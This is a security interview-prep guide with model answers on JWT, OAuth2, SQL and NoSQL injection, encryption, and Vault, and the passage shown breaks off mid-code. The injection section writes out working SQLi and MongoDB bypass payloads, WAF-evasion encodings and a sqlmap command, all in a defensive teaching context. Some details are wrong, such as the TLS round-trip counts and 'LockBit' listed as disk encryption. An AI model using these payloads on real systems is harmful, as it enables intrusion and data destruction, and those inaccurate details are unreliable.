# 🔒 Security (Backend) — Staff-Level Interview Questions

> *10 questions covering OWASP, JWT, OAuth2, encryption, and secrets management — every question expects principal engineer-level depth.*

---

## Table of Contents

1. [JWT Internals & Security Considerations](#1-jwt-internals-security-considerations)
2. [OAuth2 Flows & OpenID Connect](#2-oauth2-flows-openid-connect)
3. [SQL Injection Prevention at Scale](#3-sql-injection-prevention-at-scale)
4. [Encryption at Rest & In Transit](#4-encryption-at-rest-in-transit)
5. [Secrets Management & Vault](#5-secrets-management-vault)
6. [Rate Limiting & DDoS Protection](#6-rate-limiting-ddos-protection)
7. [Authentication: Session vs Token vs Passwordless](#7-authentication-session-vs-token-vs-passwordless)
8. [CORS, CSRF, and SameSite Cookies](#8-cors-csrf-and-samesite-cookies)
9. [Supply Chain Security](#9-supply-chain-security)
10. [SSRF & Server-Side Vulnerabilities](#10-ssrf-server-side-vulnerabilities)

---

## 1. JWT Internals & Security Considerations

**Q:** "Design a JWT-based authentication system for a microservices architecture. The security team says JWTs are inherently insecure because anyone can decode them. Address their concerns. Specifically: how do you handle token revocation, key rotation, and the 'logout everywhere' feature?"

**What They're Really Testing:** Whether you understand JWT's security model (signed, not encrypted) and have practical solutions for the hard problems.

### Answer

**Addressing "JWT Is Insecure" — It's Signed, Not Encrypted:**

```json
// JWT = JSON Web TOKEN — the key word is "token"
// JWTs are SIGNED to verify INTEGRITY, not ENCRYPTED for secrecy.

// What the JWT contains (base64-decoded):
Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-v1"
}
Payload:
{
  "sub": "user_42",
  "name": "Alice Smith",
  "role": "admin",
  "iat": 1700000000,
  "exp": 1700003600
}

// YES, anyone can decode and READ this!
// The payload is base64-encoded, not encrypted.

// The security is in the SIGNATURE:
// HMAC-SHA256(
//   base64url(header) + "." + base64url(payload),
//   secret_key  ← ONLY the server knows this!
// )
// → Signature = 3rd segment of the JWT
// → Anyone can forge? NO (they need the secret key)
// → Anyone can tamper? NO (signature won't verify)

// So: JWT protects against TAMPERING, not against reading.
// Don't put secrets in the JWT payload!
```

**Revocation — The Hard Problem:**

```python
# JWTs are stateless — once issued, they're valid until expiry.
# You CAN'T revoke a JWT by "calling the auth server" because
# the microservice doesn't check the auth server for every request.

# Solutions (from worst to best):

# ❌ Bad: Check a "blocklist" database on every request
#   This eliminates the stateless benefit of JWTs!
def verify_jwt(token):
    if token in redis_blocklist:
        raise RevokedToken()
    # verify signature...

# ✅ Good: Short-lived access tokens + long-lived refresh tokens
ACCESS_TOKEN_LIFETIME = 15 * 60  # 15 minutes
REFRESH_TOKEN_LIFETIME = 7 * 24 * 60 * 60  # 7 days

# Microservices only verify ACCESS tokens (stateless)
# Revocation: expire the REFRESH token → user must re-authenticate
# Max time until revoked (worst case): 15 minutes

# ✅✅ Better: Rotation-based key signing
# Each version of user token uses a different signing key
# Revoke by: removing the signing key → ALL tokens signed with
# that key become invalid!

class TokenVersionService:
    def issue_token(self, user_id: int) -> str:
        version = self.get_user_version(user_id)  # from DB
        return jwt.encode({
            "sub": user_id,
            "ver": version,  # ← User's current token version
            "exp": now + 15 * 60,
        }, self.current_signing_key, algorithm="RS256")

    def verify_token(self, token: str) -> dict:
        payload = jwt.decode(token, self.current_public_key,
                             algorithms=["RS256"])
        expected_version = self.get_user_version(payload["sub"])
        if payload["ver"] != expected_version:
            # Token has been revoked — user re-authenticated
            raise RevokedToken()
        return payload

    def revoke_all_sessions(self, user_id: int):
        # Just tick the version counter! All existing tokens become invalid
        self.increment_user_version(user_id)
        # No database blocklist needed — version mismatch = invalid
```

**Key Rotation Strategy:**

```python
# JWTs need key rotation. Here's how:

class KeyRotationService:
    def __init__(self):
        # Store multiple keys by ID
        self.keys = {
            "v1-2024": {"private": load_key("v1-private.pem"),
                        "public": load_key("v1-public.pem"),
                        "created_at": "2024-01-01"},
            "v2-2024": {"private": load_key("v2-private.pem"),
                        "public": load_key("v2-public.pem"),
                        "created_at": "2024-06-01"},  # ← Current
        }
        self.current_kid = "v2-2024"

    def issue_token(self, user_id: int) -> str:
        return jwt.encode({
            "sub": user_id,
            # ...
        }, self.keys[self.current_kid]["private"],
           algorithm="RS256",
           headers={"kid": self.current_kid})

    def verify_token(self, token: str) -> dict:
        # Extract kid from header (before verification!)
        headers = jwt.get_unverified_header(token)
        key = self.keys[headers["kid"]]["public"]
        return jwt.decode(token, key, algorithms=["RS256"])

    def rotate_key(self):
        new_kid = f"v3-2024"
        self.generate_key(new_kid)
        self.keys[new_kid] = {"private": ..., "public": ...,
                              "created_at": "2024-07-01"}
        self.current_kid = new_kid

        # Old keys are kept for GRACE PERIOD (tokens issued before rotation
        # still need to be verified)
        # Remove old keys after max_token_lifetime:
        removal_date = now - timedelta(hours=1)  # max token lifetime
        for kid, key_data in list(self.keys.items()):
            if key_data["created_at"] < removal_date:
                del self.keys[kid]
```

**Logout Everywhere:**

```python
def revoke_all_sessions(user_id: int):
    # 1. Tick user's token version (invalidates ALL access tokens)
    token_version_service.increment_user_version(user_id)

    # 2. Delete all refresh tokens from database
    db.execute("DELETE FROM refresh_tokens WHERE user_id = ?", user_id)

    # 3. Optionally notify other services via event
    event_bus.publish(UserSessionsRevoked(user_id=user_id))
    # Other services can flush their local caches for this user

    # 4. Done! No need to broadcast to every microservice —
    #    they'll reject the old token at next request (signature+version)
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Signature vs encryption** | Clearly distinguishes JWT signing from encryption |
| **Revocation** | Has a concrete strategy (short TTL, version tokens, or key rotation) |
| **Key rotation** | Describes graceful rotation with overlapping key lifetimes |
| **Logout** | Explains how "logout everywhere" works without a global blocklist |

---

## 2. OAuth2 Flows & OpenID Connect

**Q:** "Design an OAuth2 authorization flow for a mobile app that needs to access user data from a third-party API (e.g., 'Login with Google'). Compare Authorization Code + PKCE vs Implicit Grant. How does OpenID Connect add identity on top of OAuth2?"

**What They're Really Testing:** Understanding of OAuth2 grant types, PKCE, and the difference between authentication and authorization.

### Answer

**Authorization Code + PKCE (The Correct Flow for Mobile Apps):**

```
Mobile App                 Backend              Google Auth Server
    │                         │                        │
    │ 1. Login Request        │                        │
    │────────────────────────►│                        │
    │                         │                        │
    │ 2. Generate PKCE params │                        │
    │    code_verifier = random(128 bytes)             │
    │    code_challenge = SHA256(code_verifier)         │
    │                         │                        │
    │ 3. Open Browser to Auth URL                      │
    │◄────────────────────────┤                        │
    │    + code_challenge     │                        │
    │                         │                        │
    │ 4. User authenticates   │                        │
    │─────────────────────────────────────────────────►│
    │ 5. Authorization code   │                        │
    │◄─────────────────────────────────────────────────┤
    │    + redirect_uri       │                        │
    │                         │                        │
    │ 6. Auth Code + Verifier │                        │
    │────────────────────────►│                        │
    │                         │ 7. Token Request       │
    │                         │   auth_code            │
    │                         │   code_verifier        │
    │                         │───────────────────────►│
    │                         │ 8. Verifies:           │
    │                         │    SHA256(verifier)    │
    │                         │    == code_challenge   │
    │                         │◄───────────────────────┤
    │                         │    access_token        │
    │ 9. API Response         │    refresh_token       │
    │◄────────────────────────┤    id_token (OIDC)     │
    │                         │                        │
```

**Why Implicit Grant Is Deprecated:**

```yaml
# Implicit Grant (deprecated by RFC 6749 bis / OAuth 2.1):
#   1. App redirects user to auth server
#   2. Auth server returns access_token in URL FRAGMENT (#token=...)
#   3. No authorization code, no client authentication
#
# Security problems:
#   - Access token in URL → leaks to browser history, server logs, referrer header
#   - No client authentication → anyone can use the redirect URL
#   - No refresh tokens → can't revoke without re-authenticating
#   - Can't bind to a specific client (no PKCE)
#
# PKCE fixes ALL of these:
#   - Code verifier is only known to this specific app instance
#   - Even if authorization code is intercepted, can't exchange without verifier
#   - Token never appears in URL
#   - Refresh token enables revocation
```

**OpenID Connect — Authentication on Top of OAuth2:**

```
OAuth2: "User authorizes App to access their Google Drive" (Authorization)
OIDC:   "User IS Alice Smith" (Authentication)

OIDC adds:
  - id_token (JWT) with claims about WHO the user is
  - UserInfo endpoint to get additional user info
  - Standardized claims (sub, name, email, email_verified, etc.)

The id_token JWT payload:
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",      // ← Stable user ID (never changes!)
  "aud": "my-app-client-id",
  "auth_time": 1700000000,
  "iat": 1700000000,
  "exp": 1700003600,
  "email": "alice@example.com",
  "email_verified": true,
  "name": "Alice Smith",
  "picture": "https://...",
  "nonce": "abc123"         // ← Replay protection
}
```

**Implementing Login with Google:**

```python
# Backend code for exchanging auth code:
@router.post("/auth/google/callback")
async def google_callback(code: str, verifier: str, state: str):
    # 1. Verify state matches (CSRF protection)
    if state != session.pop("oauth_state"):
        raise HTTPException(400, "Invalid state")

    # 2. Exchange code + verifier for tokens
    token_response = await http_client.post(
        "https://oauth2.googleapis.com/token",
        data={
            "code": code,
            "client_id": GOOGLE_CLIENT_ID,
            "client_secret": GOOGLE_CLIENT_SECRET,
            "redirect_uri": "https://myapp.com/auth/google/callback",
            "grant_type": "authorization_code",
            "code_verifier": verifier,
        }
    )
    tokens = token_response.json()

    # 3. Verify id_token (validate signature, issuer, audience)
    id_token = await verify_google_jwt(tokens["id_token"])

    # 4. Extract user info
    user = await find_or_create_user(
        provider="google",
        provider_id=id_token["sub"],
        email=id_token["email"],
        name=id_token["name"],
    )

    # 5. Issue OUR tokens
    return {
        "access_token": jwt_encode(user, expires=15*60),
        "refresh_token": generate_refresh_token(user),
    }
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **PKCE purpose** | Knows it binds authorization code to a specific client instance |
| **OIDC vs OAuth2** | Clearly distinguishes authentication (who the user is) from authorization (what app can do) |
| **Implicit deprecation** | Explains why it's gone (token in URL, no client auth, no refresh) |
| **id_token verification** | Mentions verifying iss, aud, signature, and nonce |

---

## 3. SQL Injection Prevention at Scale

**Q:** "A legacy ORM-based application has a SQL injection vulnerability discovered in a user search endpoint. Walk through the remediation strategy across the entire stack: application code changes, database hardening, and WAF rules. Also address blind SQLi, second-order injection, and NoSQL injection variants."

**What They're Really Testing:** Whether you understand that SQL injection is not a single vulnerability but a class of attacks, and have defense-in-depth strategies that go beyond just parameterized queries.

### Answer

**The Attack Walkthrough — Three SQLi Variants:**

```python
# ─── Variant 1: In-Band SQLi (Classic) ───
# Attacker input: ' OR 1=1; DROP TABLE users; --
query = f"SELECT * FROM users WHERE name = '{request['name']}'"
# Executes:
#   SELECT * FROM users WHERE name = '' OR 1=1; DROP TABLE users; --'
# Result: All users leaked + users table DROPPED

# ─── Variant 2: Blind SQLi (Boolean-Based) ───
# Attacker can't see errors, but can infer from response timing/content
# Input: ' OR (SELECT ascii(substr(password,1,1)) FROM admin)=97 --
# Compares response when condition is true vs false
# Attacker exfiltrates data ONE CHARACTER at a time
# 1000 requests → full admin password

# ─── Variant 3: Second-Order SQLi ───
# Step 1: Register with malicious username:  '; UPDATE users SET role='admin' WHERE id=42; --
# Step 2: App safely INSERTs the username (parameterized) — NO immediate exploit
# Step 3: Later, app retrieves username and uses it in ANOTHER query:
#         f"SELECT * FROM audit WHERE changed_by = '{username}'"
#         Now the payload executes!
# Why it's dangerous: First-order defenses (input validation) are bypassed
```

**NoSQL Injection (MongoDB):**

```javascript
// NoSQL databases are ALSO vulnerable to injection!

// Vulnerable (MongoDB):
app.post('/login', async (req, res) => {
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    });
    // Attacker sends: { "username": "admin", "password": { "$ne": "" } }
    // MongoDB interprets $ne (not equal) as an operator!
    // Query becomes: find user where username='admin' AND password != ''
    // Bypasses authentication!
});

// Fix: Never pass user input directly as MongoDB query operators
app.post('/login', async (req, res) => {
    const user = await db.collection('users').findOne({
        username: { $eq: req.body.username },  // Explicit equality
        password: { $eq: req.body.password }
    });
    // Now $ne injection doesn't work — $eq prevents operator injection
});
```

**Layer 1: Application Code — Parameterized Queries (NON-NEGOTIABLE):**

```python
# The only COMPLETE defense against SQL injection.
# Separates SQL code from data — the database engine treats
# parameters as DATA, never as executable code.

# ✅ Correct: Parameterized query
cursor.execute(
    "SELECT * FROM users WHERE name = %s AND status = %s",
    (request['name'], request['status'])
)
# Input: ' OR 1=1; --
# Treated as literal string data, not SQL code

# ❌ Wrong: String formatting (even with escape functions)
cursor.execute(
    f"SELECT * FROM users WHERE name = '{escape_string(request['name'])}'"
)
# escape_string can be bypassed with multi-byte encoding (GBK bypass)
# NEVER roll your own escaping!

# ❌ Wrong: ORM without parameterized raw queries
# Even ORMs can be vulnerable if you use raw() or execute()
Model.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")  # DANGER!

# ORM-safe approaches:
# Django: Model.objects.filter(name=name)  # ✅ ORM handles parameterization
# SQLAlchemy: session.query(User).filter(User.name == name)  # ✅
# SQLAlchemy raw: text("SELECT * FROM users WHERE name = :name").params(name=name)  # ✅
```

**Stored Procedures — Not a Magic Bullet:**

```python
# Myth: "Stored procedures prevent SQL injection"
# Truth: Stored procedures can STILL be vulnerable if they use dynamic SQL

# ❌ Vulnerable stored procedure:
CREATE PROCEDURE search_users(@name NVARCHAR(100))
AS
BEGIN
    EXEC('SELECT * FROM users WHERE name = ''' + @name + '''')  # Dynamic SQL!
END

# ✅ Safe stored procedure:
CREATE PROCEDURE search_users(@name NVARCHAR(100))
AS
BEGIN
    SELECT * FROM users WHERE name = @name  # Parameterized within SP
END
```

**Layer 2: Database Hardening (Defense in Depth):**

```sql
-- Principle of Least Privilege:
-- App connection should NEVER have DROP, TRUNCATE, CREATE, or ALTER

-- ✅ Correct: Minimal grants for the app user
GRANT SELECT, INSERT, UPDATE, DELETE ON app.users TO app_user;
GRANT SELECT ON app.orders TO app_user;
-- NEVER:
-- GRANT ALL PRIVILEGES ON DATABASE mydb TO app_user;
-- GRANT DROP, TRUNCATE, ALTER TO app_user;

-- Revoke PUBLIC schema access (prevents schema discovery)
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- Row-Level Security (RLS):
-- Even if SQLi succeeds, RLS limits what data can be accessed
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
CREATE POLICY user_isolation ON users
    USING (tenant_id = current_setting('app.tenant_id')::int);

-- Prepared Statements (server-side):
PREPARE search_users_ps(text) AS
    SELECT * FROM users WHERE name = $1;
EXECUTE search_users_ps('Alice');
-- Executing via prepared statement name prevents SQL injection
```

**Layer 3: WAF Rules (Last Line of Defense):**

```python
# WAF can block obvious attacks but is NOT a complete defense
# Attackers bypass WAF through:
#   - Unicode encoding: %u0027 instead of '
#   - Case variation: UnIoN sElEcT
#   - Comment injection: UN/**/ION SEL/**/ECT
#   - HTTP parameter pollution
#   - Hex/char encoding: CHAR(39) instead of '

# ModSecurity CRS rules:
#   - 942100: SQL Injection Detected via libinjection
#   - 942110: SQL Injection: Common Comment Patterns
#   - 942120: SQL Injection: Hex Encoding
#   - 942130: SQL Injection: tautologies (' OR 1=1)

# AWS WAF SQLI rule group:
#   - AWS-AWSManagedRulesSQLiRuleSet
#   - Blocks common SQL injection patterns
#   - Can be bypassed — NEVER rely on this alone!
```

**Detection & Monitoring:**

```python
# Log all query errors (don't expose to users):
import logging

try:
    cursor.execute(query, params)
except Exception as e:
    # Log the full error for security analysis
    logger.warning(f"Query failed: {query} | Error: {e}")
    # NEVER expose to user:
    # return {"error": str(e)}  # DANGER: Leaks schema info!
    return {"error": "An internal error occurred"}  # ✅ Safe

# Automated detection:
#   - sqlmap can detect blind SQLi automatically
#   - Run sqlmap as part of CI/CD:
#     sqlmap -u "https://staging.example.com/search?name=test" --batch
#   - DAST scanners (Burp Suite, OWASP ZAP) crawl for SQLi
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Parameterized queries** | Knows this is the ONLY complete defense, explains why escaping isn't enough |
| **Blind SQLi** | Understands time-based/boolean-based exfiltration techniques |
| **Second-order injection** | Recognizes that stored data can later become an injection vector |
| **NoSQL injection** | Mentions MongoDB operator injection ($ne, $where, $gt) |
| **Defense in depth** | Covers app, DB, WAF layers without over-relying on any single one |

---

## 4. Encryption at Rest & In Transit

**Q:** "Design the encryption strategy for a healthcare application storing PHI (Protected Health Information). Cover TLS, database encryption, key management, and the difference between encryption in transit vs at rest vs in use. The security team is concerned about key compromise — how do you rotate keys without decrypting all data?"

**What They're Really Testing:** Whether you understand encryption as a layered system (not a single knob), know the difference between encryption types, and have practical key management strategies at scale.

### Answer

**The Three States of Data:**

```yaml
# Encryption is not one thing — it's three separate problems:

┌─────────────────────────────────────────────────────────┐
│                   DATA LIFECYCLE                         │
├──────────────┬──────────────────┬──────────────────────-─┤
│  IN TRANSIT   │    AT REST        │      IN USE           │
│  Moving data  │    Stored data    │    Processing data    │
├──────────────┼──────────────────┼───────────────────────┤
│  TLS 1.3     │  AES-256-GCM     │  AMD SEV-SNP / Intel  │
│  mTLS        │  TDE / EBS       │  SGX Confidential     │
│  HSTS        │  Envelope enc.   │  Computing             │
│  Cipher suites│  Field-level     │  Memory encryption    │
├──────────────┼──────────────────┼───────────────────────┤
│  MITM        │  Stolen disk     │  Root/hypervisor      │
│  attacks     │  Backup leak     │  access attacks       │
│  Downgrade   │  Physical theft  │  Cold boot attacks    │
└──────────────┴──────────────────┴───────────────────────┘
```

**Encryption in Transit — TLS 1.3 Deep Dive:**

```python
# TLS 1.3 handshake (2 round trips vs TLS 1.2's 4):
#   Client → Server: ClientHello (supported cipher suites, key share)
#   Server → Client: ServerHello + encrypted extensions + certificate + finished
#   Client → Server: Finished (can send encrypted data IMMEDIATELY)

# Cipher suite for TLS 1.3:
#   TLS_AES_256_GCM_SHA384  ← Gold standard
#   TLS_CHACHA20_POLY1305_SHA256  ← Mobile-friendly (no AES hardware)

# NEVER use:
#   TLS 1.0 / 1.1 (deprecated, vulnerable to BEAST, POODLE)
#   TLS 1.2 with CBC mode ciphers (vulnerable to Lucky13)
#   RC4, DES, 3DES (fully broken)

# Python Flask: Enforce strong TLS
import ssl

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.minimum_version = ssl.TLSVersion.TLSv1_3  # Only TLS 1.3
context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20')  # Strong only

# Nginx: Enforce strong TLS
# ssl_protocols TLSv1.2 TLSv1.3;
# ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
# ssl_prefer_server_ciphers on;
# add_header Strict-Transport-Security 'max-age=31536000; includeSubDomains';
```

**mTLS — Mutual Authentication for Microservices:**

```python
# mTLS = Both parties present certificates
# Server verifies client's cert (not just client verifying server)

# Why mTLS for healthcare:
#   1. Every service has a unique identity (certificate)
#   2. Encrypted + authenticated at transport layer
#   3. No need for JWT/token validation between services
#   4. Certificate can be short-lived (24h, renewed via Vault/SPIFFE)

# Istio / Linkerd service mesh:
#   - Automatic mTLS between all services
#   - No application code changes needed
#   - Certificate rotation handled by the mesh
```

**Encryption at Rest — Multi-Layer Strategy:**

```python
from cryptography.fernet import Fernet
import os

# ─── Layer 1: Application-Level (Field-Level Encryption) ───
# Encrypt PHI fields BEFORE writing to database
# This protects against: DB admin access, SQL injection, backup leaks

class PHIEncryptor:
    """
    Encrypts individual PII/PHI fields.
    Each field gets its own Data Encryption Key (DEK).
    """
    def __init__(self, master_key_provider):
        self.master_key_provider = master_key_provider

    def encrypt_ssn(self, ssn: str, patient_id: str) -> str:
        # Generate a unique DEK for this patient's SSN
        dek = self.master_key_provider.generate_dek(f"ssn:{patient_id}")
        f = Fernet(dek)
        return f.encrypt(ssn.encode()).decode()

    def decrypt_ssn(self, encrypted_ssn: str, patient_id: str) -> str:
        dek = self.master_key_provider.get_dek(f"ssn:{patient_id}")
        f = Fernet(dek)
        return f.decrypt(encrypted_ssn.encode()).decode()

# ─── Layer 2: Database-Level TDE ───
# PostgreSQL pgcrypto / MySQL AES_ENCRYPT / SQL Server TDE
# Encrypts the entire database at the page level
# Protects against: stolen database files, backup tapes

# ALTER TABLESPACE pg_default ENCRYPTION INIT;
# CREATE TABLESPACE encrypted_ts WITH (encryption = 'aes-256-cbc');

# ─── Layer 3: Storage-Level Encryption ───
# AWS EBS encryption / GCP persistent disk encryption
# AES-256-XTS for block devices
# Transparent to the OS — no application changes
# Protects against: stolen disks, decommissioned hardware
```

**Envelope Encryption — The Key to Key Management:**

```python
# The problem: If you encrypt data with one key, and that key is compromised,
# you must decrypt and re-encrypt ALL data with a new key.
# 
# Solution: Envelope Encryption
#   - Data Encryption Key (DEK): encrypts the actual data
#   - Key Encryption Key (KEK): encrypts the DEK
#   - Only the KEK is stored in KMS/Vault
#   - DEK can be stored alongside the data (encrypted)

# When rotating the KEK:
#   1. Generate new KEK in KMS
#   2. Re-encrypt each DEK with the new KEK (NOT the data!)
#   3. Data stays encrypted — no need to re-encrypt terabytes

from cryptography.fernet import Fernet

class EnvelopeEncryption:
    """
    Envelope Encryption with AWS KMS
    """
    def __init__(self, kms_client, kms_key_id: str):
        self.kms = kms_client
        self.kek_id = kms_key_id  # Key Encryption Key in KMS

    def encrypt(self, plaintext: bytes) -> dict:
        # 1. Generate random Data Encryption Key
        response = self.kms.generate_data_key(
            KeyId=self.kek_id,
            KeySpec='AES_256'  # Returns: Plaintext + CiphertextBlob
        )
        dek_plaintext = response['Plaintext']      # Unencrypted DEK (in memory only)
        dek_ciphertext = response['CiphertextBlob'] # Encrypted DEK (safe to store)

        # 2. Encrypt data with the DEK
        f = Fernet(dek_plaintext)
        ciphertext = f.encrypt(plaintext)

        # 3. Store: encrypted data + encrypted DEK
        return {
            'ciphertext': ciphertext,
            'encrypted_dek': dek_ciphertext,  # Encrypted with KMS KEK
            'kek_id': self.kek_id,
        }

    def decrypt(self, encrypted_data: dict) -> bytes:
        # 1. Ask KMS to decrypt the DEK (KMS never exposes the KEK)
        response = self.kms.decrypt(
            CiphertextBlob=encrypted_data['encrypted_dek']
        )
        dek_plaintext = response['Plaintext']

        # 2. Decrypt data with the DEK
        f = Fernet(dek_plaintext)
        return f.decrypt(encrypted_data['ciphertext'])

    # Key rotation:
    #   - Generate new KEK (new KMS key)
    #   - For each record: KMS re-encrypt the DEK with new KEK
    #   - Data NEVER needs re-encryption!
    #   - Old KEK retained for decryption of existing records
```

**Encryption in Use — Confidential Computing:**

```yaml
# The frontier: encrypting data WHILE IT'S BEING PROCESSED
# 
# AMD SEV-SNP:
#   - Encrypts VM memory with a per-VM key
#   - Hypervisor cannot read VM memory (even with physical access)
#   - CPU decrypts on-the-fly during execution
#
# Intel SGX:
#   - Encrypts memory regions (enclaves) at the CPU level
#   - Even the OS/kernel cannot read enclave memory
#   - Attestation: remote party can verify they're talking to genuine enclave
#
# Use cases for healthcare:
#   - Processing genetic data in untrusted cloud environments
#   - Multi-party computation between hospitals
#   - Federated learning on PHI
```

**Key Rotation Strategy:**

```python
# Rotation without downtime or full re-encryption:

class KeyRotationManager:
    """
    Manages key versions for zero-downtime rotation.
    """
    def __init__(self, kms_client):
        self.kms = kms_client
        # Active keys: new encryption uses the current key
        self.active_key_ids = {
            'current': 'alias/phi-key-v2',  # For NEW encryptions
            'previous': 'alias/phi-key-v1', # For DECRYPTION of old data
        }

    def encrypt(self, plaintext: bytes) -> dict:
        # Always use the CURRENT key for new encryptions
        return self._encrypt_with_key(plaintext, self.active_key_ids['current'])

    def decrypt(self, encrypted_data: dict) -> bytes:
        # Decrypt based on which KEK was used
        kek_id = encrypted_data.get('kek_id', 'alias/phi-key-v1')
        return self._decrypt_with_key(encrypted_data, kek_id)

    def rotate_key(self):
        # 1. Create new KMS key
        new_key = self.kms.create_key(Description='PHI Key v3')
        new_key_id = f'arn:aws:kms:...:key/{new_key["KeyMetadata"]["KeyId"]}'

        # 2. Create alias pointing to new key
        self.kms.create_alias(
            AliasName='alias/phi-key-v3',
            TargetKeyId=new_key_id
        )

        # 3. Update active keys
        #    current → v3, previous → v2
        #    v1 key is retained for decryption only
        self.active_key_ids = {
            'current': 'alias/phi-key-v3',
            'previous': 'alias/phi-key-v2',
        }

        # 4. Background job: re-encrypt DEKs with v3
        #    (re-wrap, not re-encrypt data)
        for record in self.scan_all_encrypted_records():
            if record['kek_id'] == 'alias/phi-key-v1':
                # Re-wrap DEK with v3 key
                new_encrypted_dek = self.kms.re_encrypt(
                    CiphertextBlob=record['encrypted_dek'],
                    DestinationKeyId=self.active_key_ids['current']
                )['CiphertextBlob']
                # Update record with new encrypted DEK
                record['encrypted_dek'] = new_encrypted_dek
                record['kek_id'] = self.active_key_ids['current']
                record.save()

        # 5. After all records are re-wrapped, schedule old key deletion
        #    (KMS enforces minimum 7-day waiting period)
        self.kms.schedule_key_deletion(
            KeyId='alias/phi-key-v1',
            PendingWindowInDays=30
        )
```

**Attack Scenarios & Mitigations:**

```yaml
# Attack 1: TLS Downgrade
#   Attacker intercepts ClientHello, forces TLS 1.0 instead of TLS 1.3
#   Mitigation: Server-side minimum TLS version, disable backward compat

# Attack 2: Key Compromise
#   Attacker gains access to KMS (compromised IAM credentials)
#   Mitigation:
#     - KMS key policies restrict to specific IAM roles
#     - Multi-factor authorization for key deletion
#     - CloudTrail logging for all KMS API calls
#     - Envelope encryption: even with KMS access, need DEK to decrypt

# Attack 3: Backup Leak
#   Encrypted database backup falls into wrong hands
#   Mitigation:
#     - TDE protects database files even at rest
#     - Backup encryption (separate key from live DB)
#     - Offline backup: encrypt with offline KMS key

# Attack 4: Cold Boot Attack
#   Attacker with physical access reads RAM to extract encryption keys
#   Mitigation:
#     - AMD SEV / Intel SGX for sensitive data
#     - Memory encryption at the hardware level
#     - LockBit / BitLocker with TPM binding
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Envelope encryption** | Explains DEK vs KEK and why re-wrapping DEKs avoids re-encrypting data |
| **Three states** | Clearly distinguishes in-transit, at-rest, and in-use encryption |
| **Key rotation** | Describes zero-downtime rotation without data re-encryption |
| **mTLS** | Mentions mutual TLS for service-to-service authentication |
| **Confidential computing** | Shows awareness of SEV/SGX for encrypting data in use |

---

## 5. Secrets Management & Vault

**Q:** "Design a secrets management strategy for a 200-microservice architecture. How do you handle database credential rotation, API key distribution, and preventing secrets from leaking into logs or source control?"

**What They're Really Testing:** Whether you understand that secrets management is a platform problem, not a config problem, and know production-grade solutions like HashiCorp Vault.

### Answer

**The Fundamental Principle: Secrets Are a Service, Not a Config**

```yaml
# NEVER do this:
config.json:
  DATABASE_URL: "postgresql://admin:SuperSecret1!@prod-db:5432/mydb"
  REDIS_PASSWORD: "redis-pass-123"
  API_KEY: "sk-live-abc123xyz"
  JWT_SECRET: "my-jwt-secret-key"

# This leaks in:
#   - Git history (even if .gitignored now, it might have been committed once)
#   - CI/CD logs
#   - Developer machines
#   - Debug endpoints
#   - Environment variable dumps (/proc/self/environ)
#   - Error stack traces
```

**HashiCorp Vault — The Production Standard:**

```python
# Vault provides:
#   1. Dynamic secrets — short-lived, auto-expiring credentials
#   2. Leased secrets — TLS certs with configurable TTL
#   3. Encrypted storage — data encrypted before writing to backend
#   4. Audit logging — every access is logged
#   5. ACL-based access — granular permissions per path

# Example: Dynamic Database Credentials

# Step 1: Configure Vault with database plugin
# vault write database/config/prod-db \
#     plugin_name=postgresql-database-plugin \
#     allowed_roles="app-role" \
#     connection_url="postgresql://{{username}}:{{password}}@prod-db:5432/"

# Step 2: Create a role for dynamic credentials
# vault write database/roles/app-role \
#     db_name=prod-db \
#     creation_statements="CREATE USER \"{{name}}\" WITH PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
#     default_ttl="1h" \
#     max_ttl="24h"

# Step 3: Application retrieves credentials at startup
import hvac

client = hvac.Client(url='https://vault.internal:8200', token=app_token)

# Request dynamic database credentials
creds = client.secrets.database.generate_credentials(
    name='app-role',
    mount_point='database'
)
# Returns:
# {
#   "data": {
#     "username": "v-app-role-4f3a2b1c-...",
#     "password": "A1b2C3d4E5f6...",
#     "lease_id": "database/creds/app-role/abc123",
#     "lease_duration": 3600,  # 1 hour — auto-expires!
#     "renewable": True
#   }
# }

# Use credentials to connect
connection = psycopg2.connect(
    host='prod-db',
    user=creds['data']['username'],
    password=creds['data']['password'],
    database='mydb'
)
# After 1 hour, these credentials expire and are useless
```

**Dynamic Secrets vs Static Secrets:**

```yaml
Static Secrets:
  - Stored encrypted in Vault, decrypted at app startup
  - Same credential reused across restarts
  - Rotation requires manual process or Vault's rotation API
  - If leaked, valid until rotated

Dynamic Secrets:
  - Generated on demand, unique per request/session
  - Auto-expire after TTL (no revocation needed)
  - Each service instance gets different credentials
  - If leaked, useless after TTL
  - Audit trail: exactly WHO requested WHAT credential, WHEN
```

**Lease-Based Secrets (TLS Certs):**

```python
# Vault can issue short-lived TLS certificates
# Each cert has a TTL (e.g., 24 hours)
# Services renew before expiry

class VaultTLSManager:
    def __init__(self):
        self.client = hvac.Client(url='https://vault.internal:8200')
        self.cert = None
        self.key = None

    def get_certificate(self, common_name: str):
        # Issue new cert or renew existing
        result = self.client.secrets.pki.generate_certificate(
            name='internal-ca',
            common_name=common_name,
            ttl='24h',
            alt_names=[f'{common_name}.service.consul']
        )
        return result['data']['certificate'], result['data']['private_key']

    def renew_periodically(self):
        while True:
            self.cert, self.key = self.get_certificate('my-service')
            time.sleep(12 * 3600)  # Renew every 12 hours (before 24h TTL)
```

**Preventing Secrets in Logs:**

```python
# Log redaction — never optional!
import re
import logging

class SecretRedactingFormatter(logging.Formatter):
    SECRET_PATTERNS = [
        (r'password=[^\s&]+', 'password=***'),
        (r'secret=[^\s&]+', 'secret=***'),
        (r'Bearer [A-Za-z0-9-._~+/]+', 'Bearer ***'),
